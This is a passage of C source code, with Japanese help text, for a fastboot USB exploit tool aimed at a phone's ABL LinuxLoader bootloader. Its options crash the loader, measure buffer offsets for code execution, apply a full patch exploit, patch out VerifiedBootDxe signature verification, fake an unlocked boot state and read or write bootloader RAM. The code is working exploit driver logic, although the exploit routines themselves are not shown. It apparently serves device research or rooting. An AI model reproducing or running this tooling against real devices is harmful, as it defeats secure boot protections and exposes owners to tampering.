    puts("  -s size       他のオプションで使用するサイズを設定");
    puts("  -c command    fastbootコマンド文字列を設定");
    puts("  -x            ABLパッチの拡張版を使用");
    puts("  -0            ABL LinuxLoaderをクラッシュさせる基本テストケース");
    puts("  -1            設定済みfastbootコマンドを実行");
    puts("  -2            コードヒットまでのバッファオフセット距離を返す試み");
    puts("  -3            -2オプションと同様だが代替手法を使用");
    puts("  -4            ABL LinuxLoader完全パッチエクスプロイトを実行");
    puts("  -5            -4オプションと同様だが代替手法を使用");
    puts("  -6            VerifiedBootDxeの署名検証をパッチ");
    puts("  -7            kcmdlineで 'green' -> 'orange' による偽アンロック");
    puts("  -8            ブートコマンドを2つのカーネルイメージ使用にパッチ");
    puts("  -9            パッチレベルオーバーライドのテスト（実験的）");
    puts("  -l            RAMからブートローダーログを読み出し（-4/-5が先に必要）");
    puts("  -m            XBL UEFIモジュールをベースアドレス付きで一覧表示");
    puts("  -a addr       BL RAMの読み書きオプションで使用するアドレスを設定");
    puts("  -M module     UEFIモジュールのベースアドレスをRAM読み書きアドレスに設定");
    puts("  -r            BL内の 'addr' から 'size' バイトを読み出し");
    puts("  -O file       ツールバッファから 'size' バイトを 'file' に書き込み");
    puts("  -I file       'file' をツールバッファに読み込み 'size' も設定");
    puts("  -w            BL内の 'addr' に 'size' バイトを書き込み");
    puts("  -P file       PEファイルをツールバッファに読み込みリロケーション実行");
    puts("                'addr' ベースに設定、'size' をコード境界に設定、");
    puts("                LinuxLoaderファイル名の場合は-4/-5パッチを適用");
    puts("  -p patch      指定した 'patch' シーケンスをツールバッファに適用");
    puts("");
    puts("'patch' はコンマで区切られた1つ以上の 'subpatch' で構成");
    puts("'subpatch' は ':/%@' のいずれかで区切られた 'hexoffs' と 'patchseq' のペア");
    puts("それぞれの文字は 'patchseq' 各要素のサイズまたは形式を指定");
    puts("'patchseq' はコンマで区切られた16進値のリスト");
    puts("");
    puts("'hexoffs' と 'patchseq' 区切り文字の意味:");
    puts("  :             'patchseq' の16進値はバイト値");
    puts("  /             'patchseq' の16進値は32ビット値");
    puts("  %             'patchseq' の16進値はバイトスワップされる32ビット値");
    puts("  @             'patchseq' の16進値は64ビット値");
    puts("");
}


int main(int argc, char **argv)
{
    int i;
    int res;
    int offset = -1;
    int size = -1;
    uint64_t addr = 0;
    const char *cmd = NULL;
    struct fbusb *dev;

    if (argc > 1 && strcmp(argv[1], "-h") == 0) {
        show_help();
        return 0;
    }

    dev = fbusb_init(0x0fce, 0x0dde, 0, 0x81, 0x01);
    if (dev == NULL)
        return 1;

    argc--; argv++;
    for ( ; argc > 0; argc--, argv++) {
        res = 0;
        if (argv[0][0] != '-')
            continue;
        switch (argv[0][1]) {
        case 'v': fbusb_inc_verbosity(dev); break;
        case 'q': fbusb_dec_verbosity(dev); break;
        case 'V': if (verbosity < LOG_DBG) verbosity++; break;
        case 'Q': if (verbosity > 0) verbosity--; break;
        case 'A':
            getvar_all(dev);
            if (offset < 0)
                offset = target->offset;
            if (size < 0)
                size = target->size;
            break;
        case 'B':
            getvar_single(dev, "version-bootloader");
            if (offset < 0)
                offset = target->offset;
            if (size < 0)
                size = target->size;
            break;
        case 'U': getvar_single(dev, "unknown"); break;
        case '0': res = test0(dev, size, offset, cmd); break;
        case '1': res = test1(dev, size, offset, cmd); break;
        case '2': res = test2(dev, size, offset, cmd); break;
        case '3': res = test3(dev, size, offset, cmd); break;
        case '4': res = test4(dev, size, offset, target->llname); break;
        case '5': res = test5(dev, size, offset, target->llname); break;
        case '6': res = test6(dev, size, offset); break;
        case '7': res = test7(dev, size, offset); break;
        case '8': res = test8(dev, size, offset, cmd); break;
        case '9': res = test9(dev, size, offset); break;
        case 'r': if (abl_mem_read(dev, addr, size, buffer)) res = -1; break;
        case 'w': if (abl_mem_write(dev, addr, size, buffer)) res = -1; break;
        case 'l': abl_print_logbuf(dev); break;
        case 'm': abl_list_modules(dev); break;
        case 'x': abl_patch_ext++; break;
        }
        if (argc < 2)
            continue;
        switch (argv[0][1]) {
        case 'b':
            fbusb_set_maxsize(dev, strtoul(argv[1], NULL, 0));
            argc--; argv++;
            break;
        case 't':
            fbusb_set_timeout(dev, strtoul(argv[1], NULL, 0));
            argc--; argv++;
            break;
        case 'a': addr = strtoul(argv[1], NULL, 0); argc--; argv++; break;
        case 'o': offset = strtoul(argv[1], NULL, 0); argc--; argv++; break;
        case 's': size = strtoul(argv[1], NULL, 0); argc--; argv++; break;
        case 'c': cmd = argv[1]; argc--; argv++; break;
        case 'p': patch_buff(buffer, size, argv[1]); argc--; argv++; break;
        case 'C':
            cmdline[0] = ' ';
            strncpy(cmdline + 1, argv[1], sizeof(cmdline) - 2);
            argc--; argv++;
            break;
        case 'D':
            cmdlinex[0] = ' ';
            strncpy(cmdlinex + 1, argv[1], sizeof(cmdlinex) - 2);
            argc--; argv++;
            break;
        case 'X':
            override_flag = strtoul(argv[1], NULL, 0);
            argc--; argv++;
            break;
        case 'M':
            res = get_module_addr(dev, argv[1], &addr);
            argc--; argv++;
            break;
        case 'I':
            res = file_rd_buff(argv[1], buffer, sizeof(buffer));
            argc--; argv++;
            if (res < 0)
                goto terminate;
            size = res;
            break;
        case 'O':
            res = file_wr_buff(argv[1], buffer, size);
            argc--; argv++;
            if (res < 0)
                goto terminate;
            break;
        case 'P':
            size = 0;
            res = load_pe(argv[1], buffer, sizeof(buffer), addr, &size);
            argc--; argv++;
            if (res <= 0 || size <= 0) {
                res = -1;
                goto terminate;
            }
            if (strstr(argv[0], target->llname) != NULL) {
                if (abl_patch_ext > 1)
                    size = res;
                target->patch_abl(buffer, abl_patch_ext);
                PNFO("%s を読み込み (res=%d, size=%d), LinuxLoader %s"
                     "パッチを適用\n", argv[0], res, size,
                     abl_patch_ext ? "ext " : "");
            } else
                PNFO("%s を読み込み (res=%d, size=%d)\n", argv[0], res, size);
            break;
        }
        if (res < 0)
            break;
    }

  terminate:
    fbusb_exit(dev);
    return res != 0 ? 1 : 0;
}
